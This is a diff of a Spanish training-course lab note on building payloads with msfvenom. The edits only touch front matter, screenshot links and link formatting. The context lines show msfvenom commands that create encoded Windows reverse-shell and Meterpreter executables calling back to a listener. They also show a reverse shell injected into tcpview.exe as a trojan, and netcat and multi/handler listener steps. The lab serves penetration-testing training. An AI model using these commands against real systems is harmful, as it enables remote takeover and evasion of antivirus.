@@ -1,22 +1,12 @@
 ---
-title: "📖 Práctica: Generación y Evasión de Payloads con Msfvenom"
+title: "💣 Creación de Payloads con Msfvenom"
 aliases:
-  - Generación y Evasión de Payloads con Msfvenom
-  - PoC msfvenom
+  - 💣 Creación de Payloads con Msfvenom
 tags:
   - ifct0109/pocs
-  - conceptos-fundamentales
+  - conceptos
   - msfvenom
   - payloads
-  - metasploit
-  - malware
----
-
-# 📖 Práctica: Generación y Evasión de Payloads con Msfvenom
-
-> [!abstract] Resumen del Laboratorio
-> Módulo de Conceptos Fundamentales del Certificado IFCT0109: análisis de mecanismos base de redes, inspección de protocolos, desarrollo de pruebas de concepto e interactividad con herramientas de diagnóstico y auditoría técnica.
-
 ---
 
 # 💣 Creación de Payloads con Msfvenom
@@ -195,6 +185,8 @@ lhost=10.0.0.6 lport=443 -e x86/shikata_ga_nai -i 3 -f exe -o revshell.exe
 msfvenom -l encoders
 ```
 
+![Lista de encoders](../../../archivos_descargados/imagenes/conceptos_fundamentales/msfvenom_images/media/image1.png)
+
 ### 🎧 Paso 2: Poner Kali a la Escucha
 
 #### 🐉 En Kali Linux:
@@ -294,6 +286,8 @@ msfconsole
 
 Espera a que cargue Metasploit Framework.
 
+![Iniciar msfconsole](../../../archivos_descargados/imagenes/conceptos_fundamentales/msfvenom_images/media/image2.png)
+
 ### 📡 Paso 3: Cargar el Exploit Handler
 
 Carga el módulo `exploit/multi/handler`:
@@ -301,6 +295,8 @@ Carga el módulo `exploit/multi/handler`:
 ```bash
 use exploit/multi/handler
 ```
+
+![Cargar exploit handler](../../../archivos_descargados/imagenes/conceptos_fundamentales/msfvenom_images/media/image3.png)
 
 ### ⚙️ Paso 4: Configurar el Payload
 
@@ -318,6 +314,8 @@ set LPORT 445
 show options
 ```
 
+![Configurar opciones](../../../archivos_descargados/imagenes/conceptos_fundamentales/msfvenom_images/media/image4.png)
+
 Verifica que `LHOST` y `LPORT` coincidan con los del payload generado.
 
 ### 🚀 Paso 6: Lanzar el Exploit
@@ -332,6 +330,8 @@ O también:
 run
 ```
 
+![Lanzar exploit](../../../archivos_descargados/imagenes/conceptos_fundamentales/msfvenom_images/media/image5.png)
+
 Metasploit quedará esperando la conexión.
 
 ### ▶️ Paso 7: Ejecutar en la Víctima
@@ -343,6 +343,8 @@ Ejecuta `meterpreter.exe`
 ### ✅ Resultado Esperado
 
 En Metasploit verás:
+
+![Sesión Meterpreter abierta](../../../archivos_descargados/imagenes/conceptos_fundamentales/msfvenom_images/media/image6.png)
 
 ```bash
 [*] Sending stage (175174 bytes) to 10.0.0.12
@@ -411,7 +413,7 @@ Consiste en inyectar el payload dentro de un ejecutable legítimo. El programa s
 
 Vamos a usar **TCPView** de Microsoft como plantilla.
 
-https://learn.microsoft.com/en-us/sysinternals/downloads/tcpview
+[https://learn.microsoft.com/en-us/sysinternals/downloads/tcpview](https://learn.microsoft.com/en-us/sysinternals/downloads/tcpview)
 
 Descárgalo y descomprímelo. Usaremos el archivo `tcpview.exe`.
 
@@ -426,6 +428,8 @@ msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp \
 lhost=10.0.0.6 lport=443 -x tcpview.exe -k \
 -e x86/shikata_ga_nai -b '\x00' -i 10 -f exe -o tcp_revshell.exe
 ```
+
+![Generar payload con template](../../../archivos_descargados/imagenes/conceptos_fundamentales/msfvenom_images/media/image7.png)
 
 #### 📋 Nuevos parámetros:
 
@@ -524,9 +528,3 @@ Este conocimiento debe usarse ÚNICAMENTE para:
 | Reverse Shell | `msfvenom -p windows/shell_reverse_tcp lhost=IP lport=443 -e x86/shikata_ga_nai -i 3 -f exe -o shell.exe` | `nc -lvnp 443` |
 | Meterpreter | `msfvenom -p windows/meterpreter/reverse_tcp lhost=IP lport=445 -e x86/shikata_ga_nai -i 3 -f exe -o met.exe` | `msfconsole → use exploit/multi/handler` |
 | Con Template | `msfvenom -p windows/shell_reverse_tcp lhost=IP lport=443 -x app.exe -k -e x86/shikata_ga_nai -i 10 -f exe -o trojan.exe` | `nc -lvnp 443` |
-
----
-
-## 🔗 Enlaces y Referencias
-* 🗂️ [[02 - MODULOS/05 - Prácticas (PoCs)|Catálogo General de Prácticas (PoCs)]]
-* 🏠 [[00 - INDICE|Inicio del Vault]]
